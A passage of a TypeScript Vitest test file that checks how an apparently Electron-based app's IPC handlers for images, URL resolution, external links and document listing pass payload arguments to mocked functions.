  it('images.delete: repo receives exactly payload.id as single arg', async () => {
    const handler = handlers.get('images.delete')!;
    await handler(null, { id: 'img-del' });
    const callArgs = (images.deleteImage as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs.length).toBe(1);
    expect(callArgs[0]).toBe('img-del');
  });

  it('images.download: repo receives exactly payload.url as single arg', async () => {
    const handler = handlers.get('images.download')!;
    await handler(null, { url: 'https://example.com/img.png' });
    const callArgs = (images.downloadImage as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs.length).toBe(1);
    expect(callArgs[0]).toBe('https://example.com/img.png');
  });

  it('url.resolve: repo receives exactly payload.url as single arg', async () => {
    const handler = handlers.get('url.resolve')!;
    await handler(null, { url: 'https://example.com' });
    const callArgs = (urlResolver.resolveUrl as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs.length).toBe(1);
    expect(callArgs[0]).toBe('https://example.com');
  });

  it('url.fetchMetadata: repo receives exactly payload.url as single arg', async () => {
    const handler = handlers.get('url.fetchMetadata')!;
    await handler(null, { url: 'https://example.com/article' });
    const callArgs = (urlMetadata.fetchUrlMetadata as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs.length).toBe(1);
    expect(callArgs[0]).toBe('https://example.com/article');
  });

  it('shell.openExternal: electron shell receives exactly payload.url', async () => {
    const handler = handlers.get('shell.openExternal')!;
    await handler(null, { url: 'https://example.com' });
    const callArgs = (shell.openExternal as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs.length).toBe(1);
    expect(callArgs[0]).toBe('https://example.com');
  });

  // ── Whole-payload passthrough handlers ──────────────────────

  it('documents.list: repo receives the full payload object as single arg', async () => {
    const handler = handlers.get('documents.list')!;
    const payload = { limit: 50, offset: 10 };
    await handler(null, payload);
    const callArgs = (docs.listDocuments as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs.length).toBe(1);
    expect(callArgs[0]).toBe(payload);
  });

  it('documents.listTrashed: repo receives the full payload object as single arg', async () => {
    const handler = handlers.get('documents.listTrashed')!;
    const payload = { limit: 100, offset: 5 };
    await handler(null, payload);
    const callArgs = (docs.listTrashedDocuments as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs.length).toBe(1);
    expect(callArgs[0]).toBe(payload);
  });

  it('documents.create: repo receives the full payload object as single arg', async () => {
    const handler = handlers.get('documents.create')!;
    const payload: Record<string, unknown> = { parentId: null, title: 'Test' };
    await handler(null, payload);
    const callArgs = (docs.createDocument as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs.length).toBe(1);
    expect(callArgs[0]).toBe(payload); // same object reference
  });
});
